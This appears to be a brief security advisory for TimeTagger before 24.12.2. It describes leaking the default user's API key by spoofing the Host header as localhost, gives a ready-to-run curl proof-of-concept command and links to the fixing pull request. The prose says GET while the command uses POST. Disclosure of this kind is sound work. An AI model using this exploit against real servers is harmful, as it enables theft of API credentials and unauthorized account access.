In TimeTagger before 24.12.2 an attacker can leak the API key for defaultuser.
This works by modifying the ``Host:`` header when making a GET request to the `bootstrap_authentication` endpoint and pointing it to localhost.


An example curl command:

``curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: 127.0.0.1' -H $'Content-Length: 32' -H $'Accept-Language: en-GB,en;q=0.9' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' -H $'Content-Type: text/plain;charset=UTF-8' -H $'Accept: */*' -H $'Origin: http://127.0.0.1' -H $'Referer: http://127.0.0.1/timetagger/login' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    --data-binary $'eyJtZXRob2QiOiJsb2NhbGhvc3QifQ==' \
$'http://($Placeholder)/timetagger/api/v2/bootstrap_authentication'``

See also https://github.com/almarklein/timetagger/pull/518